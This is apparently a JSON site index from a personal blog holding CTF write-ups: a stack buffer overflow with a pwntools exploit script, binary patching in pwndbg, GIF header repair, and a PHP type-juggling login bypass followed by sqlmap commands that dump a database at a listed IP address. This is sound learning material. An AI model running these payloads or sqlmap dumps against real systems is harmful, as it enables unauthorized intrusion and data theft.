
[{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":" Challenge Description # Name: Flow Category: pwn Points: 100 Challenge Description:\nBe like water file analysis # First I started by checking the file type using file command\nflow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=22e8e3a51853e485e3a36c1d5f95446782c30fee, for GNU/Linux 3.2.0, not stripped From the output, the file is an ELF 64-bit, dynamically linked, and not stripped. It is built for the x86-64 architecture. Next, I executed the binary to observe its behavior.\nFile execution # Upon execution, the binary prompts for user input and exits without any notable action after supplying dummy text. This behavior suggests hidden functionality, so I disassembled the binary using Ghidra. The disassembly revealed three key functions: main, vulnerable, and win. The main function calls the vulnerable() function, which can call the win() function if specific conditions are met.\nVulnerable() # The vulnerable() function accepts user input stored in a 60-byte buffer. It does not validate the input size, leaving it susceptible to buffer overflow. Within this function:\nA variable local_c is initialized to 0xc (12 in decimal). The program compares local_c to 0x34333231 (hexadecimal for \u0026ldquo;1234\u0026rdquo; in ASCII, or 4321 in decimal). Under normal execution, this condition is never satisfied because local_c is initially set to 12. However, exploiting the buffer overflow allows us to overwrite local_c with the target value (0x34333231), triggering the win() function.\nwin() # I proceeded to analyse the win function. The win() function reads the contents of flag.txt and prints it to the screen. If the file is missing, an error message is displayed.\nExploitation # To retrieve the flag, we need to:\nOverflow the buffer. Overwrite local_c with the value 0x34333231 (corresponding to the ASCII string \u0026ldquo;1234\u0026rdquo;). using pwntools # Here’s the Python script for the exploit using pwntools:\nfrom pwn import * def main(): host = \u0026#34;94.72.112.248\u0026#34; port = 7001 offset = 60 target_value = 0x34333231 # Value to overwrite `local_c` (\u0026#34;1234\u0026#34; in ASCII) # Payload payload = b\u0026#34;A\u0026#34; * offset + p32(target_value) try: conn = remote(host, port) conn.sendline(payload) response = conn.recvall() print(f\u0026#34;[+] Response:\\n{response.decode().strip()}\u0026#34;) conn.close() except Exception as e: print(f\u0026#34;[!] Error: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Running the script successfully retrieves the flag:\n└─$ python3 sol.py [+] Opening connection to 94.72.112.248 on port 7001: Done [+] Receiving all data: Done (72B) [*] Closed connection to 94.72.112.248 port 7001 [+] Response: Enter a text please: Your flag is - r00t{fl0w_0f_c0ntr0l_3ngag3d_7391} Manual exploitation # To exploit manually:\nUse pwn cyclic 60 to generate a 60-character pattern. Append \u0026quot;1234\u0026quot; to create the payload: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa1234 Send the payload to the server: └─$ nc 94.72.112.248 7001 Enter a text please: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa1234 Your flag is - r00t{fl0w_0f_c0ntr0l_3ngag3d_7391} Flag # The retrieved flag is:\nr00t{fl0w_0f_c0ntr0l_3ngag3d_7391}\n[!NOTE] In the vulnerable program, the variable local_c is compared against the value 0x34333231. This is the hexadecimal representation of the ASCII string \u0026quot;1234\u0026quot;. When overwriting memory, the bytes are written in little-endian format because the system uses the x86-64 architecture, which is little-endian by default.\nIn little-endian systems:\nThe least significant byte (LSB) is stored first in memory. For 0x34333231, the bytes are stored as: 31 32 33 34 which corresponds to the ASCII characters:\n\u0026#34;1\u0026#34; \u0026#34;2\u0026#34; \u0026#34;3\u0026#34; \u0026#34;4\u0026#34; Thus, to overwrite local_c with 0x34333231, the payload must contain \u0026quot;1234\u0026quot; in the correct byte order. If we naively sent \u0026quot;4321\u0026quot;, the bytes would be stored in reverse order (0x31323334), which would fail to meet the condition.\n","date":"23 November 2024","externalUrl":null,"permalink":"/posts/flow/","section":"Posts","summary":"P3rf3ctr00tCTF pwn chalenge","title":"Flow","type":"posts"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/tags/p3rf3ctr00tctf/","section":"Tags","summary":"","title":"P3rf3ctr00tCTF","type":"tags"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/categories/p3rf3ctr00tctf/","section":"Categories","summary":"","title":"P3rf3ctr00tCTF","type":"categories"},{"content":" Challenge Description # Name: Pores Category: rev Points: 350 Challenge Description:\nP3rf3ctr00t is locked, hidden in the depths of a binary, waiting for a hero to rewrite its fate. FIle inspection # First i started by determining the file type. The file is a linux 64-bit elf file.\nfile poresssss poresssss: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0a124b3a218c26eb707783fa5f3dc7f0763de88, for GNU/Linux 3.2.0, not stripped Analysis using Ghidra # For static analysis, I launched ghidra and imported the binary. The binary contains two functions, main() and printFlag(). the main function does nothing while the printFlag() take two parameters and calculates the flag.\nAnalysis with pwndbg # While Ghidra revealed the high-level structure of the binary, it did not show the critical conditional jump (jne) preventing printFlag from being called. This highlights the importance of dynamic analysis tools like pwndbg for a deeper understanding. I fired up pwndbg with the command pwndbg poresssss. Then disassembled main function to check whats going on there. Well there is more than i could see with ghidra. There is a condition that prevents printflag from being called. There is a comparison between 0 and 1 , if the two numbers are not equal, the program jumps to main +41 and printFlag is not called. The condition (cmp DWORD PTR [rbp-0x4], 0x1) always evaluates as not equal because rbp-0x4 is explicitly set to 0.\nPatching the program # To make sure that the program calls the printFlag() function, a patch can be done. Instead of having an operation of jne , a nop (no operation can be placed instead of jne. this ensures that the instruction between main +21 to main +36 are executed.\nTo patch the program we have to replace jne with nop. First set a break point at main with the comand break *main then run the binary. Disasseble main to check the adresses at runtime\npwndbg\u0026gt; disass main Dump of assembler code for function main: =\u0026gt; 0x0000555555555298 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000555555555299 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000055555555529c \u0026lt;+4\u0026gt;:\tsub rsp,0x10 0x00005555555552a0 \u0026lt;+8\u0026gt;:\tmov DWORD PTR [rbp-0x4],0x0 0x00005555555552a7 \u0026lt;+15\u0026gt;:\tcmp DWORD PTR [rbp-0x4],0x1 0x00005555555552ab \u0026lt;+19\u0026gt;:\tjne 0x5555555552c1 \u0026lt;main+41\u0026gt; 0x00005555555552ad \u0026lt;+21\u0026gt;:\tmov esi,0x8 0x00005555555552b2 \u0026lt;+26\u0026gt;:\tlea rax,[rip+0x2d87] # 0x555555558040 \u0026lt;flag\u0026gt; 0x00005555555552b9 \u0026lt;+33\u0026gt;:\tmov rdi,rax 0x00005555555552bc \u0026lt;+36\u0026gt;:\tcall 0x555555555159 \u0026lt;printFlag\u0026gt; 0x00005555555552c1 \u0026lt;+41\u0026gt;:\tmov eax,0x0 0x00005555555552c6 \u0026lt;+46\u0026gt;:\tleave 0x00005555555552c7 \u0026lt;+47\u0026gt;:\tret End of assembler dump. pwndbg\u0026gt; This can be done by changing the address 0x00005555555552ab and 0x00005555555552ac to 0x90 which is nop. Two addresses are modified since jne used two bytes of memory for that instruction. Both bytes need to be replaced to avoid leaving stray bytes from the original instruction, which could corrupt the execution flow and cause a crash.\nset {char} 0x00005555555552ab = 0x90 set {char} 0x00005555555552ab = 0x90 To verify, disasseble main again. This is necessary to ensure the patch is correctly applied before continuing The continue the program with the command continue\nContinuing. r00t{p4tch_th3_bin_and_h4ve_fun} [Inferior 1 (process 12780) exited normally] Key Takeaways # Dynamic Analysis Complements Static Analysis: While tools like Ghidra provide a high-level view of a binary, dynamic debugging with pwndbg uncovers critical details like conditional jumps and runtime behavior, making it essential for identifying patching opportunities.\nPatching with NOP Simplifies Control Flow: Replacing conditional jumps (jne) with NOP is an effective way to bypass checks, allowing the program to execute blocked code segments like printFlag().\n","date":"23 November 2024","externalUrl":null,"permalink":"/posts/pores/","section":"Posts","summary":"P3rf3ctr00t CTF rev chalenge","title":"Pores","type":"posts"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/tags/rev/","section":"Tags","summary":"","title":"Rev","type":"tags"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/","section":"Sholim","summary":"","title":"Sholim","type":"page"},{"content":"","date":"23 November 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Challenge Description # Name: tGIF Category: misc Points: 50 Challenge Description:\nTGIF, but I think I\u0026rsquo;m either rendering my file wrongly or the dimensions are just off. File Analysis # The challenge began with a file named tgif that did not have a recognizable file type. Running the file command gave the following output:\n└─$ file tgif tgif: data The file utility could not identify the file type. This hinted that the file might have corrupted or missing magic headers.\nHexadecimal Analysis # To investigate further, I opened the file in hexedit and examined the first few bytes. Here is part of the header:\n00000000 47 04 46 38 39 61 90 01 C8 00 F7 00 00 00 00 00 G.F89a.......... 00000010 25 1E 25 3A 31 34 3D 43 62 46 3E 48 48 35 32 4E %.%:14=CbF\u0026gt;HH52N 00000020 4D 65 4F 3A 34 56 4F 61 57 45 46 5A 3F 38 5E 46 MeO:4VOaWEFZ?8^F The header did not match any known magic number for standard file types. However, parts of it (47 04 46 38 39 61) resembled the magic header for GIF files, which should be GIF89a. GIF Bits and Bytes guide\nCorrecting the Magic Header # I replaced the incorrect bytes (47 04) with 47 49 (G and I) to create the proper magic header GIF89a. This allowed the file to be recognized as a GIF image.\n└─$ file tgif tgif: GIF image data, version 89a GIF Integrity Check # After fixing the header, I opened the GIF. It was partially corrupted—the image displayed, but it was incomplete. This suggested that some other fields in the header, such as width or height, were incorrect. Modifying the Height # To fix the GIF, I adjusted the height value in the header. I used the online tool RedKetchup GIF Resizer to modify the height and correct the file. Flag # After correcting the height, the GIF displayed correctly, revealing the full image showing the flag\nr00t{d38252762d3d4fd229faae637fd13f4c}\n","date":"23 November 2024","externalUrl":null,"permalink":"/posts/tgif/","section":"Posts","summary":"P3rf3ctr00tCTF misc chalenge","title":"tGIF","type":"posts"},{"content":"","date":"18 November 2024","externalUrl":null,"permalink":"/tags/blockctf/","section":"Tags","summary":"","title":"Blockctf","type":"tags"},{"content":"","date":"18 November 2024","externalUrl":null,"permalink":"/categories/blockctf/","section":"Categories","summary":"","title":"Blockctf","type":"categories"},{"content":" Challenge Description # Name: Juggl3r Category: Web Exploitation Points: 200 Challenge Description:\nThe admin panel seems locked behind some odd logic, and the flag is hidden deep. Can you bypass the checks and uncover the secret?\nURL: [http://54.85.45.101:8080/] Solution # enumeration # To begin, I scanned the target for directories and files using ffuf.\nffuf -u http://54.85.45.101:8080/FUZZ -ac -w /home/wordlists/SecLists/Discovery/Web-Content/combined_words.txt ![[Pasted image 20241114151734.png]] Result:\nThe scan revealed a /src directory that indexed several files. Among them, config.php and init.sql stood out as interesting.\nconfig.php: Empty. init.sql: Contained SQL instructions and sensitive data. ![[Pasted image 20241114152221.png]] Here is the content of init.sql:\nif (isset($_GET[\u0026#39;user_id\u0026#39;])) { $user_id = $_GET[\u0026#39;user_id\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE id = $user_id\u0026#34;; $stmt = $conn-\u0026gt;query($sql); if ($stmt \u0026amp;\u0026amp; $user = $stmt-\u0026gt;fetch()) { $message = \u0026#34;User found: \u0026#34; . htmlspecialchars($user[\u0026#39;username\u0026#39;]); } else { $message = \u0026#34;User not found.\u0026#34;; } } else { $message = \u0026#34;Please provide a user ID.\u0026#34;; } PHP Type Juggling Vulnerability # The admin user’s hash (0e662...) raised a red flag. This format is often indicative of a PHP type juggling vulnerability, especially when combined with weak comparison logic. The challenge name, \u0026ldquo;Juggl3r,\u0026rdquo; further hinted at this issue.\nWhat is PHP Type Juggling? # PHP’s loose comparison (==) can interpret strings that start with 0e as scientific notation (0e+...), which equals zero. If both a user-provided string and a stored hash evaluate to the same numeric value (0), the comparison will succeed.\nExploitation # Researching SHA-256 \u0026ldquo;magic hashes\u0026rdquo; led me to a payload that produces the same hash as 0e662...:\nUsername: admin Password: TyNOQHUS I logged in successfully with these credentials, accessing the admin panel.\nSQL Injection on admin.php # Once inside, I noticed that the admin panel’s URL included a user_id parameter:\nhttp://54.85.45.101:8080/admin.php?user_id=1 ![[Pasted image 20241119135439.png]]\nBy reviewing the /src/admin.php file, I discovered the following vulnerable code:\n$sql = \u0026#34;SELECT * FROM users WHERE id = $user_id\u0026#34;; $stmt = $conn-\u0026gt;query($sql); The query concatenates user input directly, making it susceptible to SQL Injection (SQLi). Using sqlmap, I automated the exploitation to enumerate databases and dump sensitive information.\nSQLi Steps # Enumerate Databases:\nsqlmap -u \u0026#34;http://54.85.45.101:8080/admin.php?user_id=1\u0026#34; --cookie=\u0026#34;PHPSESSID=...\u0026#34; --dbs ![[Pasted image 20241114161202.png]]\nEnumerate Tables in ctf_challenge:\nsqlmap -u \u0026#34;http://54.85.45.101:8080/admin.php?user_id=1\u0026#34; --cookie=\u0026#34;PHPSESSID=...\u0026#34; -D ctf_challenge --tables ![[Pasted image 20241114161128.png]]\nDump the Flag:\nsqlmap -u \u0026#34;http://54.85.45.101:8080/admin.php?user_id=1\u0026#34; --cookie=\u0026#34;PHPSESSID=...\u0026#34; -D ctf_challenge -T flags --dump ![[Pasted image 20241114161051.png]]\nFlag # flag{juggl3_inject}\nKey Takeaways # PHP Type Juggling:\nAlways use strict comparison (===) to avoid vulnerabilities when handling user input and hashes.\nSQL Injection Prevention:\nUse prepared statements or parameterized queries. Sanitize and validate user inputs. References # OWASP: PHP Type Juggling PayloadsAllTheThings ","date":"18 November 2024","externalUrl":null,"permalink":"/posts/juggl3r/","section":"Posts","summary":"Juggler challenge from blockctf","title":"Juggl3r","type":"posts"},{"content":"","date":"18 November 2024","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]